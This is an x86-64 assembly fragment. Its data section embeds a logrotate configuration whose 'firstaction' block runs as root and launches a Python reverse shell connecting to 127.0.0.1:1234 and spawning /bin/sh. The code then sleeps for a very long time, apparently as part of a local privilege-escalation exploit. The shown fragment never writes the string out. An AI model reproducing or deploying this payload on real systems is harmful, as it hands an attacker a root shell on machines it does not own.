section .data
	message db 10,"/var/crash/test.log{",10,"    su root root",10,"    daily",10,"    size=0",10,"    firstaction",10,"        python3 -c ", 34, "import sys,socket,os,pty; s=socket.socket();s.connect(('127.0.0.1', 1234));[os.dup2(s.fileno(), fd) for fd in (0,1,2)];pty.spawn('/bin/sh')", 34, ";",10,"    endscript",10,"}",10, 00
	timeval:
	tv_sec	dd 0
	tv_usec dd 0


section .text
	global _start
_start:
	mov dword [tv_sec], 4000000
	mov dword [tv_usec], 0
	mov rax, 35
	mov rdi, timeval
	mov rsi, 0
	syscall

